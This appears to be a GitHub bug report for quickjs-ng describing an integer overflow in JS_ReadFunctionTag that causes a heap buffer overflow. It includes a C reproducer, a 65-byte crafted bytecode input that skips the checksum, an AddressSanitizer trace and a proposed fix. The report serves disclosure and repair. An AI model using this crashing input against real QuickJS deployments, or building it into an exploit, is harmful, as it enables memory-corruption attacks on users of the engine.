# Heap buffer overflow in JS_ReadFunctionTag when cpool_count overflows function_size

https://github.com/quickjs-ng/quickjs/issues/1853 (opened 2026-10-27T10:35:33Z)

JS_ReadFunctionTag uses attacker-controlled cpool_count, local_count and byte_code_len directly in an int size computation, with no validation, then allocates that size and later walks cpool_count entries.

plaintext

// quickjs.c:39704
if (bc_get_leb128_int(s, &bc.cpool_count))   goto fail;
if (bc_get_leb128_int(s, &bc.byte_code_len)) goto fail;
if (bc_get_leb128_int(s, &local_count))      goto fail;

function_size = cpool_offset + bc.cpool_count * sizeof(*bc.cpool);  // int overflow
function_size += local_count * sizeof(*bc.vardefs);                 // int overflow
function_size += bc.byte_code_len;                                  // int overflow
b = js_mallocz(ctx, function_size);
sizeof(JSValue) is 16, so cpool_count > 134,217,728 wraps the multiplication. cpool_count = 0x10000001 gives * 16 = 16: a 16-byte allocation, while b->cpool_count stays at 268 million.

On the error path free_function_bytecode() then walks the full range:

plaintext

for (i = 0; i < b->cpool_count; i++)
    JS_FreeValueRT(rt, b->cpool[i]);   // past the end of the block
Reproducer:

plaintext

#include <stdio.h>
#include "quickjs.h"
int main(void) {
    unsigned char buf[1 << 20];
    size_t n = fread(buf, 1, sizeof(buf), stdin);
    if (!n) return 0;
    JSRuntime *rt = JS_NewRuntime();
    JSContext *ctx = JS_NewContext(rt);
    JSValue v = JS_ReadObject(ctx, buf, n, JS_READ_OBJ_BYTECODE);
    if (JS_IsException(v)) { JSValue e = JS_GetException(ctx); JS_FreeValue(ctx, e); }
    JS_FreeValue(ctx, v);
    JS_FreeContext(ctx); JS_FreeRuntime(rt);
    return 0;
}
65-byte input:

plaintext

1d ff ff ff ff 01 01 13 30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30 30 30 16 30 0d 01 01 01
01 00 30 30 01 30 01 30 30 30 30 07 07 30 30 30
30 30 30 0c 30 30 30 30 30 30 30 30 30 30 30 30
30
ff ff ff ff at offset 1 is the documented UINT32_MAX checksum escape hatch, so the checksum does not need to be recomputed.

Result:

plaintext

==165748==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7abb0bde0980
READ of size 4
    #0 free_function_bytecode  quickjs.c:37168:45
    #1 free_gc_object          quickjs.c:7104:9
    #2 free_zero_refcount      quickjs.c:7123:9
    #3 js_free_value_rt        quickjs.c:7169:21
    #6 JS_ReadFunctionTag      quickjs.c:39938:5
    #7 JS_ReadObjectRec        quickjs.c:40414:15
    #8 js_map_read             quickjs.c:54055:19
    #12 JS_ReadObject          quickjs.c:40617:12
Also reproduces as a plain SIGSEGV (exit 139) on a -O2 build with no sanitizers, so it is not an ASAN artifact.

Tested on commit 7a23d8e (0.17.0), x86-64 Linux.

Suggested fix: validate before the size computation and do the arithmetic in size_t with overflow checks:

plaintext

if (bc.cpool_count < 0 || bc.cpool_count > JS_MAX_CPOOL_COUNT ||
    local_count < 0    || local_count > JS_MAX_LOCAL_COUNT ||
    bc.byte_code_len < 0 || bc.byte_code_len > JS_MAX_BYTECODE_LEN)
    goto fail;
and free only the cpool entries actually initialised (the buffer is js_mallocz'd, so track the filled count or clamp b->cpool_count before any goto fail that reaches the destructor).

I know bytecode is out of scope per SECURITY.md — filing as a plain bug report, not a security report.
